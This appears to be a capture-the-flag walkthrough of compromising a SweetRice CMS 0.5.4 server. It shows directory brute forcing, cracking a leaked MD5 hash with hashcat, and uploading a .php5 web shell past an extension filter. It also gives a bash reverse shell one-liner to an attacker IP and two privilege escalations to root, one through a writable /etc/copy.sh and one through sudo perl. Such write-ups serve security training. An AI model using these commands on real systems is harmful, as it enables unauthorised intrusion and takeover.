Niceâš¡, we have port `80` and `22` opened, Navigating to port `80/HTTP` we have a default Apache web page

Running `ffuf` for dir/file bruteforce, we found 2 entries

Navigating to `/content` we have a **sweet rice** CMS page

![](https://i.imgur.com/LqnW8jw.png)

- Viewing-Page Source we know **sweet rice CMS** runs on version 0.5.4
- We found exploit on `searchsploit` but none seems to work

Decided to run a dir/file bruteforce on `/content` and we have this -:

Navigating to `/content/as` we found a login page

Tried out several attempts to login but none worked, decided to enumerate harder.

Navigating to the `/content/inc` folder we found a mysql backup directory


![](https://i.imgur.com/vA2A7Rn.png)

We can then download the backup file 

![](https://i.imgur.com/mVJfsfe.png)

Viewing the file we have a password hash in `MD5` and a username


![](https://i.imgur.com/JVnGQoo.png)

Cracking it with `hashcat`, we found a password

```bash
$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -O
```

Navigating to media center we can upload files and the files are stored under `/attachment` directly

![](https://i.imgur.com/97r84Gf.png)



Uploaded our shell as `.php5` cos' it kept filtering out normal `php` extension. Navigating to where i uploaded my shell, it kept breaking it so here is what i did

![](https://i.imgur.com/48WCFcx.png)

- create a `anything.sh` file
- Paste this into the file and save

```bash
/bin/sh -i >& /dev/tcp/10.9.75.133/1337 0>&1
```

- start up a `python` server on attacker machine and download through our web shell with `wget`

```bash
# attacker machine - python
$ python3 -m http.server 80

# target web-shell - wget
$ wget anything.sh
```

- start up your listener `nc -lvnp 1337`
- On the web shell run `bash anything.sh`

Navigating to our `/home` directory we have a `backup.pl` script, that runs a `copy.sh` script in the `/etc` folder


![](https://i.imgur.com/7jCqbSn.png)

Nice, we have read-write-execute access ðŸ¤–

![](https://i.imgur.com/YNwjUMV.png)

we can then add this script into the `/etc/copy.sh` file to get root


```bash
#!/bin/bash  
  
/bin/bash -i ;#
```

Also running `sudo -l` we can see that we have the permission to run the `backup.perl` file in `/home/itguy` folder, with `perl` as root

![](https://i.imgur.com/f59Jjtl.png)




Run the `backup.pl` script in `/home/itguy` directory and you should be root

```bash
$ sudo /usr/bin/perl /home/itguy/backup.pl
```
